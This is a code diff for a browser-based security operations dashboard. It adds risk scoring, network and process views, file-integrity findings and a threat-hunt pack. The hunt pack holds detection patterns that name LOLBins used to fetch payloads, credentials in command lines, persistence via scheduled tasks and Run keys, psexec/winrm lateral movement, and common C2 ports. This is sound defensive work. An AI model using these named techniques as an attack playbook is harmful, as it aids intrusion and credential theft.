+    hits.sort((a,b)=> new Date(a.event.time) - new Date(b.event.time));
+    const items = hits.map((h,i)=>`
+      <div class="tl-item ${h.rule.severity}">
+        <div class="num">${i+1}</div>
+        <div class="ts">${fmtTime(h.event.time)} · ${esc(h.event.host)}</div>
+        <div class="ttl"><span class="tac">${esc(h.rule.tactic)}</span>${esc(h.rule.title)}</div>
+        <div class="cl">${esc(h.event.cmd || h.event.domain || h.event.dst_ip || "—")}</div>
+      </div>`).join("");
+    return `<div class="entity-block">
+      <div class="entity-head"><b>${esc(user)}</b><span class="tag">${hits.length} flagged events</span><span class="tag">${new Set(hits.map(h=>h.event.host)).size} hosts</span><span class="tag">${new Set(hits.map(h=>h.rule.tactic)).size} tactics</span></div>
+      <div class="tl">${items}</div>
+    </div>`;
+  }).join("") || `<div class="empty-state">No correlated detections to build a timeline from.</div>`;
+}
+
+/* ================= IOCs ================= */
+function renderIOCs(){
+  const flaggedIps = new Set(DET_HITS.map(h=>h.event.dst_ip).filter(Boolean));
+  const flaggedDomains = new Set(DET_HITS.map(h=>h.event.domain).filter(Boolean));
+  const flaggedHashes = new Set(DET_HITS.map(h=>h.event.hash).filter(Boolean));
+  const flaggedUsers = new Set(DET_HITS.map(h=>h.event.user).filter(Boolean));
+  window.__flaggedIps = flaggedIps; window.__flaggedDomains = flaggedDomains; window.__flaggedHashes = flaggedHashes;
+}
+
+/* ================= UEBA ================= */
+let uebaTab = "users";
+function renderUsers(){
+  const byUser = {};
+  RAW_EVENTS.forEach(e=>{ if(!e.user) return; (byUser[e.user]=byUser[e.user]||{events:0,score:0,dets:0,hosts:new Set(),offhours:0}).events++;
+    (byUser[e.user].hosts).add(e.host);
+    const hr = new Date(e.time).getUTCHours(); if(!isNaN(hr) && (hr<6||hr>=20)) byUser[e.user].offhours++;
+  });
+  const byHost = {};
+  RAW_EVENTS.forEach(e=>{ if(!e.host) return; (byHost[e.host]=byHost[e.host]||{events:0,score:0,dets:0,users:new Set()}).events++; byHost[e.host].users.add(e.user); });
+  DET_HITS.forEach(h=>{
+    const u=h.event.user; if(u){ byUser[u]=byUser[u]||{events:0,score:0,dets:0,hosts:new Set(),offhours:0}; byUser[u].score += sevWeight[h.rule.severity]||1; byUser[u].dets++; }
+    const ho=h.event.host; if(ho){ byHost[ho]=byHost[ho]||{events:0,score:0,dets:0,users:new Set()}; byHost[ho].score += sevWeight[h.rule.severity]||1; byHost[ho].dets++; }
+  });
+
+  const src = uebaTab==="users" ? byUser : byHost;
+  const isHost = uebaTab!=="users";
+  // fold in correlation score
+  Object.entries(src).forEach(([name,d])=>{ d.corrScore = corrScoreForEntity(name, isHost); d.score += d.corrScore; });
+
+  const arr = Object.entries(src).sort((a,b)=>b[1].score-a[1].score);
+  const maxScore = Math.max(1, ...arr.map(a=>a[1].score));
+  const highRisk = arr.filter(a=>a[1].score>=30).length;
+
+  // peer-group baseline (users only — service / privileged / standard)
+  const groupScores = {};
+  if(!isHost){ arr.forEach(([name,d])=>{ const g=peerGroup(name); (groupScores[g]=groupScores[g]||[]).push(d.score); }); }
+  const groupAvg = {}; Object.entries(groupScores).forEach(([g,scores])=> groupAvg[g] = scores.reduce((a,b)=>a+b,0)/scores.length);
+
+  document.getElementById("uebaKpiRow").innerHTML = `
+    <div class="kpi"><b>${Object.keys(byUser).length}</b><span>Users profiled</span></div>
+    <div class="kpi"><b>${Object.keys(byHost).length}</b><span>Hosts profiled</span></div>
+    <div class="kpi high"><b>${highRisk}</b><span>High-risk entities</span></div>
+    <div class="kpi"><b>${Object.values(byUser).reduce((a,d)=>a+(d.offhours||0),0)}</b><span>Off-hours events</span></div>
+    <div class="kpi crit"><b>${arr.length? arr[0][1].score : 0}</b><span>Top risk score</span></div>
+  `;
+
+  document.getElementById("userRows").innerHTML = arr.map(([name,d])=>{
+    const level = d.score>=60?"CRITICAL":d.score>=30?"HIGH":d.score>=10?"MEDIUM":"LOW";
+    const offhoursPct = d.events? Math.round(((d.offhours||0)/d.events)*100) : 0;
+    const relCount = uebaTab==="users" ? `${d.hosts?d.hosts.size:0} hosts` : `${d.users?d.users.size:0} users`;
+    const g = peerGroup(name);
+    const anomalous = !isHost && d.score>10 && groupAvg[g] && d.score > 2*groupAvg[g];
+    const spark = sparklineSvg(bucketScores(name, isHost));
+    return `<div class="user-row">
+      <span class="name">${esc(name)}</span>
+      <div><div class="risk-track"><div class="risk-fill" style="width:${d.score/maxScore*100}%;background:${sevColor[level]}"></div></div></div>
+      <span class="risk-score">${d.score}${spark}</span>
+      <div class="risk-meta">
+        <span class="tag sev-tag sev-${level}" style="border:none;">${level}</span>
+        <span class="tag">${d.dets} det.</span>
+        <span class="tag">${d.events} events</span>
+        <span class="tag">${relCount}</span>
+        ${uebaTab==="users"?`<span class="tag">off-hours ${offhoursPct}%</span><span class="tag">${g}</span>`:""}
+        ${anomalous?`<span class="peer-flag">↑ vs ${esc(g)} peers</span>`:""}
+        ${d.corrScore?`<span class="tag" title="Included in score">+${d.corrScore} corr.</span>`:""}
+        <span class="risk-actions">
+          <button class="btn ghost sm" onclick="setTableFilter('${esc(name)}')">Filter</button>
+          <button class="btn ghost sm" onclick="alert('Score breakdown for ${esc(name)}:\\n${d.dets} detections + correlations × severity weight = ${d.score} points.\\n${offhoursPct}% of activity fell outside 06:00\\u201320:00 UTC.\\nPeer group: ${g}${anomalous? ' (more than 2x group average)':''}.')">Why?</button>
+        </span>
+      </div>
+    </div>`;
+  }).join("") || `<div class="empty-state">No activity loaded yet.</div>`;
+}
+function peerGroup(name){
+  if(/^svc[_-]/i.test(name)) return "service";
+  if(/admin|root/i.test(name)) return "privileged";
+  return "standard";
+}
+function bucketScores(name, isHost){
+  const times = RAW_EVENTS.map(e=>new Date(e.time)).filter(d=>!isNaN(d));
+  const buckets = new Array(8).fill(0);
+  if(!times.length) return buckets;
+  const min = Math.min(...times), max = Math.max(...times);
+  const span = Math.max(1, max-min);
+  DET_HITS.forEach(h=>{
+    const key = isHost ? h.event.host : h.event.user;
+    if(key!==name) return;
+    const t = new Date(h.event.time); if(isNaN(t)) return;
+    let idx = Math.floor(((t-min)/span)*8); if(idx>7) idx=7; if(idx<0) idx=0;
+    buckets[idx] += sevWeight[h.rule.severity]||1;
+  });
+  return buckets;
+}
+function sparklineSvg(values){
+  const max = Math.max(1,...values);
+  const w=64,h=16, step = values.length>1? w/(values.length-1):w;
+  const pts = values.map((v,i)=> `${(i*step).toFixed(1)},${(h-(v/max)*h).toFixed(1)}`).join(" ");
+  return `<svg class="spark" width="${w}" height="${h}"><polyline points="${pts}" fill="none" stroke="var(--accent)" stroke-width="1.5"/></svg>`;
+}
+document.addEventListener("click", e=>{
+  const t = e.target.closest(".ueba-tab");
+  if(t){ document.querySelectorAll(".ueba-tab").forEach(x=>x.classList.remove("active")); t.classList.add("active"); uebaTab = t.dataset.utab; renderUsers(); }
+});
+
+/* ================= NETWORK ================= */
+function renderNetwork(){
+  const wrap = document.getElementById("networkWrap");
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to see network flows.</div>`; return; }
+  const susHosts = new Set(DET_HITS.map(h=>h.event.dst_ip).filter(Boolean));
+  const srcCounts = {}, dstCounts = {};
+  RAW_EVENTS.forEach(e=>{ if(e.src_ip) srcCounts[e.src_ip]=(srcCounts[e.src_ip]||0)+1; if(e.dst_ip) dstCounts[e.dst_ip]=(dstCounts[e.dst_ip]||0)+1; });
+  const srcTop = Object.entries(srcCounts).sort((a,b)=>b[1]-a[1]).slice(0,10);
+  const dstTop = Object.entries(dstCounts).sort((a,b)=>b[1]-a[1]).slice(0,10);
+  wrap.innerHTML = `<div class="net-cols"><span>Source IP</span><span>Destination IP</span></div>
+    <div style="display:flex;justify-content:space-between;gap:40px;">
+      <div style="display:flex;flex-direction:column;gap:8px;">${srcTop.map(([ip,c])=>`<span class="net-node src">${esc(ip)}<span class="n">${c}×</span></span>`).join("")||"—"}</div>
+      <div style="display:flex;flex-direction:column;gap:8px;align-items:flex-end;">${dstTop.map(([ip,c])=>`<span class="net-node ${susHosts.has(ip)?'sus':'dst'}">${esc(ip)}<span class="n">${c}×</span></span>`).join("")||"—"}</div>
+    </div>
+    <footer class="note">Red = destination IP co-occurred with a fired detection. Counts are total flow occurrences in the loaded window.</footer>`;
+}
+
+function renderTreeGraph(){
+  const wrap = document.getElementById("treeGraphWrap");
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to see the IP relationship graph.</div>`; return; }
+  const srcCounts = {}, dstCounts = {}, pairCounts = {};
+  RAW_EVENTS.forEach(e=>{
+    if(e.src_ip) srcCounts[e.src_ip]=(srcCounts[e.src_ip]||0)+1;
+    if(e.dst_ip) dstCounts[e.dst_ip]=(dstCounts[e.dst_ip]||0)+1;
+    if(e.src_ip && e.dst_ip){ const k=e.src_ip+"→"+e.dst_ip; pairCounts[k]=(pairCounts[k]||0)+1; }
+  });
+  const susHosts = new Set(DET_HITS.map(h=>h.event.dst_ip).filter(Boolean));
+  const srcTop = Object.entries(srcCounts).sort((a,b)=>b[1]-a[1]).slice(0,12).map(x=>x[0]);
+  const dstTop = Object.entries(dstCounts).sort((a,b)=>b[1]-a[1]).slice(0,12).map(x=>x[0]);
+  const rowH = 34, top=20, leftX=110, rightX=560, w=680, h=Math.max(srcTop.length,dstTop.length)*rowH+40;
+
+  let svg = `<svg width="${w}" height="${h}" style="overflow:visible;">`;
+  srcTop.forEach((sip,i)=>{
+    dstTop.forEach((dip,j)=>{
+      const key = sip+"→"+dip;
+      if(pairCounts[key]){
+        const y1 = top+i*rowH+8, y2 = top+j*rowH+8;
+        svg += `<path d="M ${leftX} ${y1} C ${(leftX+rightX)/2} ${y1}, ${(leftX+rightX)/2} ${y2}, ${rightX} ${y2}" stroke="${susHosts.has(dip)?'#E5484D':'#5FA8D3'}" stroke-width="${Math.min(3,1+pairCounts[key]/10)}" fill="none" opacity="0.35"/>`;
+      }
+    });
+  });
+  svg += `</svg>`;
+
+  const leftLabels = srcTop.map((ip,i)=>`<div class="net-node src" style="position:absolute;left:0;top:${top+i*rowH}px;">${esc(ip)}<span class="n">${srcCounts[ip]}×</span></div>`).join("");
+  const rightLabels = dstTop.map((ip,i)=>`<div class="net-node ${susHosts.has(ip)?'sus':'dst'}" style="position:absolute;left:${rightX-30}px;top:${top+i*rowH}px;">${esc(ip)}<span class="n">${dstCounts[ip]}×</span></div>`).join("");
+
+  wrap.innerHTML = `<div style="position:relative;width:${w}px;height:${h}px;">${svg}${leftLabels}${rightLabels}</div>
+    <footer class="note">Click values elsewhere in the app to trace an IP's activity in the Log Table. Red destination nodes co-occurred with a fired detection.</footer>`;
+}
+
+/* ================= URLS & DOMAINS ================= */
+function renderUrls(){
+  const wrap = document.getElementById("urlsWrap");
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to extract URLs and domains.</div>`; return; }
+  const flaggedDomains = new Set(DET_HITS.map(h=>h.event.domain).filter(Boolean));
+  const domainCounts = {}, urlCounts = {};
+  RAW_EVENTS.forEach(e=>{ if(e.domain) domainCounts[e.domain]=(domainCounts[e.domain]||0)+1; if(e.url) urlCounts[e.url]=(urlCounts[e.url]||0)+1; });
+  const domains = Object.entries(domainCounts).sort((a,b)=>b[1]-a[1]);
+  const urls = Object.entries(urlCounts).sort((a,b)=>b[1]-a[1]);
+  wrap.innerHTML = `
+    <div class="ioc-section"><h4>Domains (${domains.length})</h4>
+      <div class="chip-row">${domains.map(([d,c])=>`<span class="chip clickable ${flaggedDomains.has(d)?'flag':''}" onclick="setTableFilter('${esc(d)}')" title="Click to filter Log Table">${esc(defang(d))}<span class="sub">${c}×</span></span>`).join("")||"—"}</div></div>
+    <div class="ioc-section"><h4>URLs (${urls.length})</h4>
+      <div class="chip-row">${urls.map(([u,c])=>`<span class="chip clickable" onclick="setTableFilter('${esc(u)}')" title="Click to filter Log Table">${esc(defang(u))}<span class="sub">${c}×</span></span>`).join("")||"—"}</div></div>
+    <footer class="note">Domains/URLs are shown defanged (dots replaced with [.], http → hxxp) for safe copy-paste into tickets or chat.</footer>`;
+}
+
+/* ================= PROCESS ================= */
+function renderProcess(){
+  const wrap = document.getElementById("processWrap");
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to see process activity.</div>`; return; }
+  const flaggedProcs = new Set(DET_HITS.map(h=>h.event.process).filter(Boolean));
+  const procCounts = {}, pairs = {};
+  RAW_EVENTS.forEach(e=>{
+    if(e.process) procCounts[e.process]=(procCounts[e.process]||0)+1;
+    if(e.parent && e.process){ const k=e.parent+" → "+e.process; pairs[k]=(pairs[k]||0)+1; }
+  });
+  const procs = Object.entries(procCounts).sort((a,b)=>b[1]-a[1]);
+  const pairArr = Object.entries(pairs).sort((a,b)=>b[1]-a[1]).slice(0,20);
+  wrap.innerHTML = `
+    <div class="ioc-section"><h4>Unique processes (${procs.length})</h4>
+      <div class="chip-row">${procs.map(([p,c])=>`<span class="chip clickable ${flaggedProcs.has(p)?'flag':''}" onclick="setTableFilter('${esc(p)}')">${esc(p)}<span class="sub">${c}×</span></span>`).join("")||"—"}</div></div>
+    <div class="ioc-section"><h4>Top parent → child relationships</h4>
+      <div>${pairArr.map(([k,c])=>`<div class="bar-row"><span class="label" style="width:280px;font-family:var(--mono);">${esc(k)}</span><div class="bar-track"><div class="bar-fill" style="width:${c/(pairArr[0][1])*100}%"></div></div><span class="count">${c}</span></div>`).join("")||"—"}</div></div>`;
+}
+
+/* ================= PROCESS TREE ================= */
+function renderProcessTree(){
+  const wrap = document.getElementById("ptreeWrap");
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to build process trees.</div>`; return; }
+  const flaggedEvents = new Set(DET_HITS.map(h=>h.event));
+  const byHost = {};
+  RAW_EVENTS.forEach(e=>{ if(!e.host || !e.process) return; (byHost[e.host]=byHost[e.host]||[]).push(e); });
+  wrap.innerHTML = Object.entries(byHost).map(([host,events])=>{
+    events = events.slice().sort((a,b)=>new Date(a.time)-new Date(b.time));
+    const nodes = events.slice(0,40).map(e=>{
+      const flag = flaggedEvents.has(e);
+      return `<div class="tree-node ${flag?'flag':''}">${esc(e.parent||"?")} → <span class="proc">${esc(e.process)}</span><span class="cmd">${esc((e.cmd||"").slice(0,70))}</span></div>`;
+    }).join("");
+    return `<div class="tree-host"><div class="host-name">🖥 ${esc(host)} <span class="tag" style="border:1px solid var(--border);border-radius:20px;padding:1px 7px;font-size:9.5px;color:var(--text-faint);">${events.length} processes</span></div><div class="tree-branch">${nodes}</div></div>`;
+  }).join("") || `<div class="empty-state">No process activity found.</div>`;
+}
+
+/* ================= HUNT PACK ================= */
+const HUNT_PACK = [
+  { title:"Rare parent-child process pairs", tactic:"Execution", hyp:"Adversaries often spawn shells from processes that don't normally spawn shells (e.g. Office apps, services.exe). Hunt for parent/child pairs seen only once or twice.",
+    test: ()=>{ const pairs={}; RAW_EVENTS.forEach(e=>{ if(e.parent&&e.process){const k=e.parent+">"+e.process; pairs[k]=(pairs[k]||0)+1;} }); return Object.values(pairs).filter(c=>c<=2).length; } },
+  { title:"Off-hours administrative activity", tactic:"Discovery", hyp:"Legitimate admin work rarely happens between 20:00 and 06:00 UTC. Hunt for privileged accounts active in that window.",
+    test: ()=>{ return RAW_EVENTS.filter(e=>{ const hr=new Date(e.time).getUTCHours(); return !isNaN(hr) && (hr<6||hr>=20) && /admin|root|administrator/i.test(e.user||""); }).length; } },
+  { title:"Living-off-the-land binaries (LOLBins)", tactic:"Defense Evasion", hyp:"Dual-use system binaries (certutil, bitsadmin, wmic, rundll32) are frequently abused to download or execute payloads while evading AV signatures.",
+    test: ()=>{ return RAW_EVENTS.filter(e=>/certutil|bitsadmin|wmic|rundll32|mshta/i.test(e.process||"")).length; } },
+  { title:"Single-use / rare destination domains", tactic:"Command and Control", hyp:"C2 infrastructure is often contacted by only one or two hosts. Domains hit by exactly one source IP are worth a closer look.",
+    test: ()=>{ const m={}; RAW_EVENTS.forEach(e=>{ if(e.domain) (m[e.domain]=m[e.domain]||new Set()).add(e.src_ip); }); return Object.values(m).filter(s=>s.size===1).length; } },
+  { title:"Credential material in command lines", tactic:"Credential Access", hyp:"Passwords or tokens passed as CLI arguments show up in process logs and EDR telemetry — a common OPSEC failure by attackers and admins alike.",
+    test: ()=>{ return RAW_EVENTS.filter(e=>/password[=:]|[^a-z]-p\s+\S|\/pass(word)?:/i.test(e.cmd||"")).length; } },
+  { title:"New scheduled tasks or run-key writes", tactic:"Persistence", hyp:"Persistence mechanisms cluster around scheduled tasks and registry Run keys. Hunt for these regardless of whether the exact rule pattern matched.",
+    test: ()=>{ return RAW_EVENTS.filter(e=>/schtasks|reg(\.exe)?\s+add/i.test(e.cmd||"")).length; } },
+  { title:"Non-standard destination ports", tactic:"Command and Control", hyp:"Traffic to high, uncommon, or historically malware-associated ports (4444, 1337, 31337, 8081/8082) deserves manual review even below detection thresholds.",
+    test: ()=>{ return RAW_EVENTS.filter(e=>e.dst_port && ![443,80,53,445,25,3389,22].includes(Number(e.dst_port))).length; } },
+  { title:"Service accounts making interactive-style calls", tactic:"Lateral Movement", hyp:"svc_ accounts calling wmic/psexec/winrm outside their normal automation pattern can indicate compromised service credentials.",
+    test: ()=>{ return RAW_EVENTS.filter(e=>/^svc[_-]/i.test(e.user||"") && /psexec|wmic|winrm|invoke-command/i.test(e.cmd||"")).length; } },
+];
+function renderHunt(){
+  const wrap = document.getElementById("huntWrap");
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to run the hunt pack.</div>`; document.getElementById("navHuntCount").textContent="0"; return; }
+  let hitCount = 0;
+  wrap.innerHTML = HUNT_PACK.map(h=>{
+    const n = h.test();
+    if(n>0) hitCount++;
+    return `<div class="hunt-card">
+      <div class="top"><h5>${esc(h.title)}</h5><span class="hunt-status ${n>0?'hit':'clear'}">${n>0? n+" matches" : "clear"}</span></div>
+      <div class="hyp">${esc(h.hyp)}</div>
+      <div class="meta">Tactic: ${esc(h.tactic)}</div>
+    </div>`;
+  }).join("");
+  document.getElementById("navHuntCount").textContent = hitCount;
+}
+
+/* ================= FIM RENDER ================= */
+function renderFim(){
+  const findWrap = document.getElementById("fimFindingsWrap");
+  const kpiWrap = document.getElementById("fimKpiRow");
+  const tblBody = document.getElementById("fimTableBody");
+  const badge = document.getElementById("navFimCount");
+  if(!findWrap) return;
+
+  if(!FIM_EVENTS.length){
+    findWrap.innerHTML = `<div class="empty-state">No File Integrity Monitoring logs loaded yet. Upload a Qualys FIM export (JSON or CSV) from the Upload screen — the format is auto-detected — or load the FIM sample below.</div>`;
+    if(kpiWrap) kpiWrap.innerHTML = "";
+    if(tblBody) tblBody.innerHTML = "";
+    if(badge) badge.textContent = "0";
+    return;
+  }
+
+  const actionCounts = {};
+  FIM_EVENTS.forEach(e=>{ const a=e.action||"Unknown"; actionCounts[a]=(actionCounts[a]||0)+1; });
+  const critFindings = FIM_HITS.filter(h=>h.rule.severity==="CRITICAL").length;
+  kpiWrap.innerHTML = `
+    <div class="kpi"><b>${FIM_EVENTS.length}</b><span>FIM events</span></div>
+    <div class="kpi"><b>${actionCounts["Create"]||0}</b><span>Creates</span></div>
+    <div class="kpi"><b>${(actionCounts["Content"]||0)+(actionCounts["Attributes"]||0)}</b><span>Modifies</span></div>
+    <div class="kpi high"><b>${actionCounts["Delete"]||0}</b><span>Deletes</span></div>
+    <div class="kpi crit"><b>${FIM_HITS.length}</b><span>Findings</span></div>
+    <div class="kpi crit"><b>${critFindings}</b><span>Critical</span></div>
+  `;
+  if(badge) badge.textContent = FIM_HITS.length;
+
+  const byRule = {};
+  FIM_HITS.forEach(h=>{ (byRule[h.rule.id]=byRule[h.rule.id]||{rule:h.rule,items:[]}).items.push(h.event); });
+  const findings = Object.values(byRule).sort((a,b)=>b.items.length-a.items.length);
+
+  findWrap.innerHTML = findings.map(f=>{
+    const ex = f.items[0];
+    const hosts = [...new Set(f.items.map(e=>e.host).filter(Boolean))];
+    return `<div class="hunt-card" style="border-left:3px solid ${sevColor[f.rule.severity]};">
+      <div class="top"><h5>${esc(f.rule.title)}</h5><span class="sev-tag sev-${f.rule.severity}">${f.rule.severity}</span></div>
+      <div class="meta" style="margin-bottom:10px;">${esc(f.rule.category)} · ${f.items.length} event(s) across ${hosts.length} host(s)</div>
+      <div style="font-size:12.5px;color:var(--text-dim);line-height:1.6;margin-bottom:12px;">${f.rule.explain(ex)}</div>
+      <div style="font-size:10.5px;color:var(--text-faint);text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px;">What to do</div>
+      <ul class="rep-reasons" style="margin-bottom:12px;">${f.rule.actions.map(a=>`<li>${esc(a)}</li>`).join("")}</ul>
+      <table class="kv-table">
+        <tr><td>Host</td><td>${esc(ex.host)}</td></tr>
+        <tr><td>User</td><td>${esc(ex.user)}</td></tr>
+        <tr><td>Action</td><td>${esc(ex.action)}</td></tr>
+        <tr><td>File / Path</td><td>${esc(ex.filePath)}</td></tr>
+        <tr><td>Process</td><td>${esc(ex.process)||"—"}</td></tr>
+        <tr><td>Reputation</td><td>${esc(ex.reputation)||"—"}</td></tr>
+        <tr><td>Trust status</td><td>${esc(ex.trustStatus)||"—"}</td></tr>
+        <tr><td>Qualys rule</td><td>${esc(ex.ruleName)||"—"}</td></tr>
+        ${ex.oldContent||ex.newContent?`<tr><td>Old → New</td><td>${esc((ex.oldContent||"—").toString().slice(0,120))} → ${esc((ex.newContent||"—").toString().slice(0,120))}</td></tr>`:""}
+      </table>
+    </div>`;
+  }).join("") || `<div class="empty-state">FIM logs loaded, but none matched a built-in explanation rule — browse the full event table below.</div>`;
+
+  tblBody.innerHTML = FIM_EVENTS.slice(0,1000).map(e=>{
+    const hit = FIM_HITS.find(h=>h.event===e);
+    return `<tr>
+      <td>${fmtTime(e.time)}</td>
+      <td><span class="sev-tag sev-${e.severity in sevColor?e.severity:'MEDIUM'}">${esc(e.severity)}</span></td>
+      <td>${esc(e.host)}</td><td>${esc(e.user)}</td><td>${esc(e.action)}</td>
+      <td title="${esc(e.filePath)}">${esc(e.filePath)}</td>
+      <td>${esc(e.reputation)}</td><td>${esc(e.trustStatus)}</td>
+      <td>${hit? esc(hit.rule.title) : "—"}</td>
+    </tr>`;
+  }).join("") || `<tr><td colspan="9" style="text-align:center;color:var(--text-faint);padding:30px;">No FIM events</td></tr>`;
+}
+
+/* ================= CORRELATIONS RENDER ================= */
+function renderCorrelations(){
+  const wrap = document.getElementById("corrWrap");
+  if(!wrap) return;
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to compute correlations.</div>`; document.getElementById("navCorrCount").textContent="0"; document.getElementById("corrKpiRow").innerHTML=""; return; }
+  const bySev = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+  CORR_HITS.forEach(c=> bySev[c.severity] = (bySev[c.severity]||0)+1);
+  document.getElementById("corrKpiRow").innerHTML = `
+    <div class="kpi crit"><b>${CORR_HITS.length}</b><span>Correlated signals</span></div>
+    <div class="kpi crit"><b>${bySev.CRITICAL||0}</b><span>Critical</span></div>
+    <div class="kpi high"><b>${bySev.HIGH||0}</b><span>High</span></div>
+    <div class="kpi"><b>${bySev.MEDIUM||0}</b><span>Medium</span></div>`;
+  wrap.innerHTML = CORR_HITS.map(c=>`
+    <div class="corr-card ${c.severity}">
+      <div class="top"><h5>${esc(c.title)}</h5><span class="sev-tag sev-${c.severity}">${c.severity}</span></div>
+      <div class="desc">${esc(c.detail)}</div>
+      <div class="meta">Entity: ${esc(c.entity)} · Tactic: ${esc(c.tactic)} · ${c.events.length} event(s)
+        <button class="btn ghost sm" style="margin-left:10px;" onclick="setTableFilter('${esc(String(c.entity))}')">View in table</button>
+      </div>
+    </div>`).join("") || `<div class="empty-state">No multi-event correlations found in the loaded data. Add a watchlist or IP intel for more coverage.</div>`;
+  document.getElementById("navCorrCount").textContent = CORR_HITS.length;
+}
+
+/* ================= CUSTOM RULES RENDER ================= */
+function renderCustomRules(){
+  if(!document.getElementById("customRulesWrap")) return;
+  const customs = RULES.filter(r=>r.custom);
+  document.getElementById("navCustomCount").textContent = customs.length;
+  document.getElementById("customRulesWrap").innerHTML = customs.map(r=>`
+    <div class="custom-rule-row">
+      <div><b>${esc(r.title)}</b><div style="color:var(--text-faint);font-family:var(--mono);font-size:10.5px;">${esc(r.tactic)} · ${esc(r.technique)} · ${r.severity}</div></div>
+      <span class="del" onclick="deleteCustomRule('${r.id}')">Remove</span>
+    </div>`).join("") || `<div class="empty-state" style="padding:30px 0;">No custom rules yet — compile one on the left.</div>`;
+}
+window.deleteCustomRule = function(id){
+  const i = RULES.findIndex(r=>r.id===id);
+  if(i>-1) RULES.splice(i,1);
+  DET_HITS = runDetections(RAW_EVENTS);
+  render();
+};
+
+/* ================= MITRE MATRIX ================= */
+function renderMitre(){
+  const tactics = [...new Set(RULES.map(r=>r.tactic))];
+  const byTactic = {};
+  tactics.forEach(t=> byTactic[t] = RULES.filter(r=>r.tactic===t));
+  document.getElementById("mitreMatrix").innerHTML = tactics.map(t=>{
+    const rules = byTactic[t];
+    const cells = rules.map(r=>{
+      const hits = DET_HITS.filter(h=>h.rule.id===r.id).length;
+      return `<div class="matrix-cell ${r.severity} ${hits>0?'hit':''}" onclick="goToRule('${r.id}')" style="cursor:pointer;">
+        <div class="t">${esc(r.title)}</div>
+        <div class="n">${esc(r.technique)} · ${hits} hit${hits===1?"":"s"}</div>
+      </div>`;
+    }).join("") || `<div class="matrix-empty">No rules</div>`;
+    return `<div class="matrix-col"><div class="hd">${esc(t)}</div>${cells}</div>`;
+  }).join("");
+}
+
+/* ================= SOC TOOLS ================= */
+function ipToInt(ip){ const p=ip.split(".").map(Number); if(p.length!==4||p.some(isNaN)) return null; return ((p[0]<<24)>>>0)+(p[1]<<16)+(p[2]<<8)+p[3]; }
+function isPrivateIp(ip){ return /^10\.|^192\.168\.|^172\.(1[6-9]|2\d|3[01])\./.test(ip); }
+function subnet24(ip){ const parts=ip.split("."); if(parts.length!==4) return "—"; return parts[0]+"."+parts[1]+"."+parts[2]+".0/24"; }
+function hashType(h){ if(!h) return ""; if(h.length===32) return "MD5"; if(h.length===40) return "SHA1"; if(h.length===64) return "SHA256"; return "HASH"; }
+function tryBase64(str){
+  if(!str || str.length<8) return null;
+  const m = str.match(/[A-Za-z0-9+/]{16,}={0,2}/);
+  if(!m) return null;
+  try{ const dec = atob(m[0]); if(/^[\x09\x0A\x0D\x20-\x7E]*$/.test(dec)) return dec.slice(0,140); }catch(e){}
+  try{ const dec = decodeURIComponent(escape(atob(m[0].replace(/\0/g,"")))); return dec.slice(0,140); }catch(e){}
+  return null;
+}
+function tryJwt(str){
+  const m = (str||"").match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
+  if(!m) return null;
+  const parts = m[0].split(".");
+  try{
+    const header = JSON.parse(atob(parts[0].replace(/-/g,"+").replace(/_/g,"/")));
+    const payload = JSON.parse(atob(parts[1].replace(/-/g,"+").replace(/_/g,"/")));
+    return {raw:m[0], header, payload};
+  }catch(e){ return null; }
+}
+
+function renderTools(){
+  const wrap = document.getElementById("toolsWrap");
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to populate SOC Tools from real values.</div>`; return; }
+
+  const ips = [...new Set(RAW_EVENTS.flatMap(e=>[e.src_ip,e.dst_ip]).filter(Boolean))];
+  const hashes = [...new Set(RAW_EVENTS.map(e=>e.hash).filter(Boolean))];
+  const domains = [...new Set(RAW_EVENTS.map(e=>e.domain).filter(Boolean))];
+  const urls = [...new Set(RAW_EVENTS.map(e=>e.url).filter(Boolean))];
+  const regKeys = [...new Set(RAW_EVENTS.map(e=>{ const m=(e.cmd||"").match(/HK(LM|CU|CR|U)\\[^\s]+/i); return m?m[0]:null; }).filter(Boolean))];
+  const emails = [...new Set(RAW_EVENTS.flatMap(e=>{ const m=(JSON.stringify(e).match(/[\w.+-]+@[\w-]+\.[\w.-]+/g)||[]); return m; }))];
+  const b64s = RAW_EVENTS.map(e=>({src:e, dec:tryBase64(e.cmd)})).filter(x=>x.dec).slice(0,8);
+  const jwts = RAW_EVENTS.map(e=>tryJwt(e.cmd)||tryJwt(e.url)).filter(Boolean).slice(0,6);
+  const flaggedDomains = window.__flaggedDomains || new Set();
+
+  wrap.innerHTML = `
+    <div class="tool-block"><h4>IP addresses → subnet calc${Object.keys(ipIntel).length?' + intel':''}</h4>
+      ${ips.map(ip=>`<span class="tool-chip" onclick="copyText('${esc(subnet24(ip))}',this)">${esc(ip)} <span class="op">${isPrivateIp(ip)?'private':'public'} · ${esc(subnet24(ip))}${ipIntel[ip]?` · ${esc(ipIntel[ip].country||'')} ${esc(ipIntel[ip].asn||'')}`:''}</span></span>`).join("")||"—"}
+    </div>
+    <div class="tool-block"><h4>File hashes → identify &amp; copy</h4>
+      ${hashes.map(h=>`<span class="tool-chip" onclick="copyText('${esc(h)}',this)">${esc(h.slice(0,16))}… <span class="op">${hashType(h)}</span></span>`).join("")||"—"}
+    </div>
+    <div class="tool-block"><h4>Domains → reputation flag</h4>
+      ${domains.map(d=>`<span class="tool-chip" onclick="copyText('${esc(defang(d))}',this)">${esc(d)} <span class="op">${flaggedDomains.has(d)?'⚑ flagged':'copy defanged'}</span></span>`).join("")||"—"}
+    </div>
+    <div class="tool-block"><h4>URLs → extract &amp; defang</h4>
+      ${urls.map(u=>`<span class="tool-chip" onclick="copyText('${esc(defang(u))}',this)">${esc(u.slice(0,42))}${u.length>42?"…":""} <span class="op">defang &amp; copy</span></span>`).join("")||"—"}
+    </div>
